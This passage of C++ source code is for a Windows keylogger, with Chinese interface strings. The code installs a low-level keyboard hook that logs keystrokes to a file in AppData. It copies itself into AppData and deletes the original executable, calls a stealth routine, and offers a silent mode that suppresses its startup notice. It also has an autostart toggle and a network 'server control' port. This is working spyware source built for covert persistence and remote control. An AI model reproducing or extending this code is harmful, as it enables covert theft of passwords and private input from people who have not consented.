                {
                    if (!enabled)
                        ShowToastNotification(L"开机自启已启用", L"启动设置");
                    else
                        ShowToastNotification(L"开机自启已禁用", L"启动设置");
                }
                else
                {
                    ShowToastNotification(L"设置开机自启失败", L"错误");
                }
            }
            else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                bool silent = IsSilentMode();
                if (SetSilentMode(!silent))
                {
                    if (!silent)
                        ShowToastNotification(L"静默模式已启用", L"模式设置");
                    else
                        ShowToastNotification(L"静默模式已禁用", L"模式设置");
                }
                else
                {
                    ShowToastNotification(L"设置静默模式失败", L"错误");
                }
            }
            else
            {
                if (isRecording)
                {
                    Save(kbdStruct.vkCode);
                }
            }
        }
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

bool CreateShortcut(const std::wstring& targetPath, const std::wstring& shortcutPath)
{
    if (fs::exists(shortcutPath))
        return true;

    CoInitialize(NULL);
    IShellLinkW* psl = NULL;
    IPersistFile* ppf = NULL;
    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl);
    if (SUCCEEDED(hr))
    {
        psl->SetPath(targetPath.c_str());
        psl->SetDescription(L"Keyboard Logger");
        hr = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
        if (SUCCEEDED(hr))
        {
            hr = ppf->Save(shortcutPath.c_str(), TRUE);
            ppf->Release();
        }
        psl->Release();
    }
    CoUninitialize();
    return SUCCEEDED(hr);
}

void HandleSelfCopyAndDelete()
{
    wchar_t appdataPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdataPath)))
        return;

    std::wstring targetDir = std::wstring(appdataPath) + L"\\Keylogger";
    fs::create_directories(targetDir);

    std::wstring currentExe = GetModulePath();
    std::wstring targetExe = targetDir + L"\\" + fs::path(currentExe).filename().wstring();

    if (currentExe != targetExe)
    {
        if (!CopyFileW(currentExe.c_str(), targetExe.c_str(), FALSE))
        {
            //MessageBoxW(NULL, L"复制程序到 %appdata%\\Keylogger 失败", L"错误", MB_ICONERROR);
            return;
        }

        std::wstring originalDir = fs::path(currentExe).parent_path().wstring();
        std::wstring shortcutName = fs::path(currentExe).stem().wstring() + L".lnk";
        std::wstring shortcutPath = originalDir + L"\\" + shortcutName;
        CreateShortcut(targetExe, shortcutPath);

        // 使用 ShellExecuteExW 启动副本，传递原程序路径以便删除
        std::wstring params = L"--delete-old \"" + currentExe + L"\"";
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = L"open";
        sei.lpFile = targetExe.c_str();
        sei.lpParameters = params.c_str();
        sei.nShow = SW_HIDE;  // 隐藏窗口

        std::wcout << L"Starting new process with params: " << params << std::endl;

        if (ShellExecuteExW(&sei))
        {
            // 等待副本进程启动完成（可选）
            WaitForInputIdle(sei.hProcess, 5000);
            CloseHandle(sei.hProcess);
            ExitProcess(0);   // 原进程退出
        }
        else
        {
            DWORD err = GetLastError();
            std::wcerr << L"ShellExecuteExW failed, error: " << err << std::endl;
            wchar_t msg[256];
            wsprintfW(msg, L"启动副本失败，错误码：%lu", err);
            MessageBoxW(NULL, msg, L"错误", MB_ICONERROR);
        }
    }
    else
    {
        // 从命令行获取要删除的旧程序路径
        std::wstring cmdLine = GetCommandLineW();
        std::wcout << L"Command line: " << cmdLine << std::endl;

        int argc;
        LPWSTR* argv = CommandLineToArgvW(cmdLine.c_str(), &argc);

        std::wcout << L"Argument count: " << argc << std::endl;
        for (int i = 0; i < argc; i++) {
            std::wcout << L"argv[" << i << L"]: " << argv[i] << std::endl;
        }

        // 查找 --delete-old 参数
        std::wstring oldPath;
        bool foundDeleteArg = false;

        for (int i = 1; i < argc - 1; i++) {
            if (wcscmp(argv[i], L"--delete-old") == 0) {
                // 支持路径包含空格的情况：从 i+1 开始合并所有剩余参数
                oldPath = argv[i + 1];
                // 如果路径被分割成多个参数（不包含盘符分隔符），合并它们
                for (int j = i + 2; j < argc; j++) {
                    // 检查是否是另一个参数（以 - 开头）
                    if (argv[j][0] == L'-') {
                        break;
                    }
                    oldPath += L" ";
                    oldPath += argv[j];
                }
                foundDeleteArg = true;
                break;
            }
        }

        if (foundDeleteArg && !oldPath.empty())
        {
            std::wcout << L"Attempting to delete: " << oldPath << std::endl;

            // 等待原程序退出
            std::wcout << L"Waiting 5 seconds for original process to exit..." << std::endl;
            Sleep(5000);

            bool deleted = false;
            DWORD lastError = 0;
            for (int i = 0; i < 10; ++i)
            {
                std::wcout << L"Attempt " << (i + 1) << L": Checking if file exists..." << std::endl;

                if (!fs::exists(oldPath))
                {
                    std::wcout << L"File already deleted or does not exist" << std::endl;
                    deleted = true;
                    break;
                }

                std::wcout << L"File exists, attempting to delete..." << std::endl;
                SetFileAttributesW(oldPath.c_str(), FILE_ATTRIBUTE_NORMAL);

                if (DeleteFileW(oldPath.c_str()))
                {
                    std::wcout << L"Successfully deleted old program" << std::endl;
                    deleted = true;
                    break;
                }

                lastError = GetLastError();
                std::wcout << L"Delete failed, error: " << lastError << std::endl;

                if (lastError == ERROR_SHARING_VIOLATION || lastError == ERROR_ACCESS_DENIED)
                {
                    std::wcout << L"File in use, waiting 1 second..." << std::endl;
                    Sleep(1000);
                    continue;
                }
                else
                {
                    break;
                }
            }

            if (!deleted)
            {
                std::wcout << L"Normal delete failed, trying MoveFileEx..." << std::endl;
                if (!MoveFileExW(oldPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
                {
                    lastError = GetLastError();
                    std::wcerr << L"MoveFileEx failed, error: " << lastError << std::endl;

                    wchar_t msg[512];
                    swprintf_s(msg, L"删除原程序失败。\n路径: %s\n错误码: %lu\n将在下次重启时尝试删除。",
                        oldPath.c_str(), lastError);
                    MessageBoxW(NULL, msg, L"删除警告", MB_ICONWARNING);
                }
                else
                {
                    std::wcout << L"Scheduled for deletion on next reboot" << std::endl;
                    MessageBoxW(NULL, L"原程序将在下次重启时删除", L"提示", MB_ICONINFORMATION);
                }
            }
        }
        else {
            std::wcout << L"No --delete-old argument found or path is empty" << std::endl;
        }
        if (argv) LocalFree(argv);
    }
}

int main()
{
    HandleSelfCopyAndDelete();

    Stealth();

    // 读取上次保存的录制状态
    isRecording = GetSavedRecordingState();

    if (!IsSilentMode()) {
        wchar_t msg[512];
        swprintf_s(msg, L"Keylogger 已启动\n\n当前状态: %s\n\n快捷键说明:\n"
            L"Ctrl + Shift + Alt + P  暂停/继续录制\n"
            L"Ctrl + Shift + Alt + Q  停止录制\n"
            L"Ctrl + Shift + Alt + S  启用/禁用开机自启\n"
            L"Ctrl + Shift + Alt + D  启用/禁用静默模式\n\n"
            L"日志保存在 %%appdata%%\\Keylogger\n"
            L"服务器控制端口: %d",
            isRecording ? L"录制中" : L"已暂停",
            g_localPort);
        MessageBoxW(NULL, msg, L"Keylogger", MB_OK);
    }

#ifdef bootwait 
    while (IsSystemBooting())
    {
        std::cout << "System is booting. Checking again in 10 seconds...\n";
        Sleep(10000);
    }
#endif
#ifdef nowait 
    std::cout << "Skipping system boot check.\n";
#endif

    GetLogDirectory();

    StartServerControl();

    std::string output_filename = MakeOutputFilename();
    std::cout << "Output log to " << output_filename << std::endl;

    output_file.open(output_filename, std::ios_base::app | std::ios::binary);

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
    StopServerControl();
    CleanupNotifyIcon();
    ReleaseHook();
    output_file.close();
    return 0;
}
